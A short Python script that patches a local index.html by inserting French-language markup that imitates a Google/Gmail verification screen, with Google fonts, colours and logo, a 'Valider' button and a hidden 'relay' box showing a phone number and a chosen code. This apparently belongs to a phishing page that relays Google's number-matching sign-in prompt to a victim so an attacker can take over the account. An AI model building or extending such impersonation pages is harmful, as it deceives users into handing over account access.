with open("C:/Users/Leo/cademo/index.html", "r", encoding="utf-8") as f:
    content = f.read()

old = """            </p></div>
      </div>
    </div>

</div>

<script>"""

new = """            </p>

            <!-- Affichage du code relay (cache par defaut) -->
            <div id="relay-display" style="display:none;margin-bottom:24px;padding:16px;background:#f8f9fa;border-radius:8px;text-align:center;">
                <div id="relay-phone" style="font-size:13px;color:#5f6368;margin-bottom:8px;"></div>
                <div style="font-size:14px;color:#5f6368;font-weight:500;">Choisi :</div>
                <div id="relay-code" style="font-size:42px;font-weight:700;color:#1a73e8;letter-spacing:6px;"></div>
            </div>

            <!-- Illustration Gmail -->
            <div style="width:200px;height:100px;margin:32px auto;background:#f8f9fa;border-radius:12px;padding:20px;display:flex;align-items:center;justify-content:center;gap:16px;">
                <svg width="50" height="40" viewBox="0 0 50 40" fill="none">
                    <rect x="2" y="8" width="46" height="30" rx="2" fill="#e8eaed"/>
                    <path d="M2 8 L25 25 L48 8" stroke="#dadce0" stroke-width="2" fill="none"/>
                    <circle cx="15" cy="32" r="8" fill="#34A853"/>
                    <path d="M12 32 L14 34 L18 30" stroke="white" stroke-width="2" fill="none"/>
                </svg>
                <svg width="30" height="50" viewBox="0 0 30 50" fill="none">
                    <circle cx="15" cy="12" r="8" stroke="#5f6368" stroke-width="3" fill="none"/>
                    <rect x="13" y="18" width="4" height="20" fill="#5f6368"/>
                    <rect x="18" y="30" width="8" height="4" fill="#5f6368"/>
                    <rect x="18" y="38" width="8" height="4" fill="#5f6368"/>
                </svg>
                <svg width="40" height="50" viewBox="0 0 40 50" fill="none">
                    <path d="M20 2 L35 8 L35 22 Q35 38 20 46 Q5 38 5 22 L5 8 Z" fill="#1a73e8"/>
                    <text x="20" y="32" font-size="20" fill="white" text-anchor="middle" font-weight="bold">G</text>
                </svg>
            </div>

            <button id="mail-validate-btn" onclick="CD.validateMail()" disabled style="width:100%;height:48px;background-color:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:500;cursor:pointer;margin:24px 0;font-family:Google Sans,Roboto,Arial,sans-serif;opacity:0.6;" onmouseover="if(!this.disabled) this.style.backgroundColor='#1557b0'" onmouseout="if(!this.disabled) this.style.backgroundColor='#1a73e8'">Valider</button>

            <p id="mail-pending" style="font-size:14px;color:#5f6368;text-align:center;margin:8px 0;font-family:Roboto,Arial,sans-serif;">En attente de confirmation...</p>

            <p style="font-size:14px;color:#5f6368;text-align:center;margin-top:24px;font-family:Roboto,Arial,sans-serif;">Vous n'avez pas recu le code ? <a href="#" style="color:#1a73e8;text-decoration:none;font-weight:500;">Renvoyer le code</a></p>
        </div>
    </div>

</div>

<script>"""

if old in content:
    content = content.replace(old, new)
    print("Mail-info content restored")
else:
    print("Pattern NOT found")

with open("C:/Users/Leo/cademo/index.html", "w", encoding="utf-8") as f:
    f.write(content)
